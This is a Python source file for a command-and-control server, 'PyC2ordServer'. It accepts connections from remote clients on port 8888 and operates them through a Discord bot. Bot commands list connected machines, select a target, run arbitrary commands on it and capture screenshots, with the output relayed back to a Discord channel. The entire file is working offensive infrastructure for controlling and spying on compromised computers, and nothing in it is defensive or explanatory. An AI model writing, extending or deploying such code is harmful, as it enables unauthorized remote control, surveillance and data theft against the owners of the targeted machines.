import socket
import base64
import threading
import signal
import os
import logging
import discord
import requests
from discord.ext import commands
import asyncio
import json
import time

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PyC2ordServer:
    def __init__(self):
        self.clients = []
        self.target_client = None
        self.bot_instance = None
        self.server_socket = None
        self.heartbeat_interval = 60  # Set the interval for sending heartbeat messages in seconds

    async def send_data(self, client_socket, data):
        try:
            client_socket.send(data.encode())
        except Exception as e:
            logger.error(f"Error sending data: {str(e)}")

    async def recv_data(self, client_socket, buffer_size=4096):
        try:
            return client_socket.recv(buffer_size).decode()
        except Exception as e:
            logger.error(f"Error receiving data: {str(e)}")
            return None

    async def handle_client_commands(self, client_socket, client_id):
        try:
            self.target_client = self.clients[client_id]
            last_heartbeat_time = time.time()

            while True:
                # Check for client disconnection based on heartbeat
                current_time = time.time()
                if current_time - last_heartbeat_time > self.heartbeat_interval:
                    logger.info(f"Connection from {client_id} timed out (no heartbeat)")
                    self.clients.remove(client_id)
                    break

                data = await self.recv_data(client_socket)
                if not data:
                    logger.info(f"Connection from {client_id} closed")
                    self.clients.remove(client_id)
                    break
                elif data == "ping":
                    # Received a heartbeat response
                    last_heartbeat_time = current_time
                else:
                    command = data
                    response = await self.execute_command_on_target(command)
                    await self.relay_response_to_discord(response)
        except Exception as e:
            logger.error(f"Error handling client commands: {str(e)}")
        finally:
            client_socket.close()

    async def execute_command_on_target(self, command):
        try:
            client_socket = self.target_client[1]
            await self.send_data(client_socket, command)
            if command == "screenshot":
                screenshot_data = b""
                while True:
                    packet = client_socket.recv(4096)
                    if not packet: break
                    screenshot_data += packet
                return screenshot_data
            else:
                response = await self.recv_data(client_socket)
                return response
        except Exception as e:
            logger.error(f"Error executing command: {str(e)}")
            return str(e)

    async def relay_response_to_discord(self, response):
        if self.bot_instance is not None and response.strip():
            channel = self.bot_instance.get_channel(self.target_client[2])
            if channel:
                await channel.send(response)
            else:
                logger.error("Channel not found.")
        else:
            logger.error("Bot instance not available or response is empty")

    def close_server(self):
        logger.info("\nStopping the server...")
        self.server_socket.close()
        os._exit(0)

    def main(self):
        host = "0.0.0.0"
        port = 8888

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((host, port))
        self.server_socket.listen(5)

        logger.info(f"Server listening on {host}:{port}")

        def run_server():
            while True:
                client_socket, address = self.server_socket.accept()
                ip_address = address[0]
                self.clients.append([ip_address, client_socket, None])
                asyncio.run_coroutine_threadsafe(self.handle_client_commands(client_socket, len(self.clients) - 1), loop)

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        server_thread = threading.Thread(target=run_server)
        server_thread.start()

        signal.signal(signal.SIGINT, lambda signal, frame: self.close_server())

        intents = discord.Intents.all()
        TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
        GUILD = "Command and Control"

        bot = commands.Bot(command_prefix='!', intents=intents)
        self.bot_instance = bot

        @bot.event
        async def on_ready():
            logger.info(f'Bot is ready. Logged in as {bot.user}')

        @bot.command(name='list')
        async def list_clients(ctx):
            list_str = "Connected Clients:\n"
            for i, client_info in enumerate(self.clients):
                list_str += f"{i} - {client_info[0]}\n"
            await ctx.send(list_str)

        @bot.command(name='target')
        async def set_target(ctx, client_id: int):
            try:
                channel_id = ctx.channel.id
                self.target_client = self.clients[client_id]
                self.target_client[2] = channel_id
                await ctx.send(f"Target set to {self.target_client[0]}")
            except IndexError:
                await ctx.send("Invalid client ID")

        @bot.command(name='execute')
        async def execute_command(ctx, *, command: str):
            response = await self.execute_command_on_target(command)
            await self.relay_response_to_discord(response)

        @bot.command(name='h')
        async def show_help(ctx):
            await ctx.send("Available commands:\n!list - List connected clients\n!target [client_id] - Set target client\n!execute [command] - Execute command on target\n!screenshot - Take a screenshot on target")

        @bot.command(name='screenshot')
        async def take_screenshot(ctx):
            screenshot_data = await self.execute_command_on_target('screenshot')
            with open("screenshot.png", "wb") as f:
                f.write(screenshot_data)
            await ctx.send(file=discord.File("screenshot.png"))
            os.remove("screenshot.png")  # Remove the file after sending

        bot.run(TOKEN)

if __name__ == "__main__":
    server = PyC2ordServer()
    server.main()
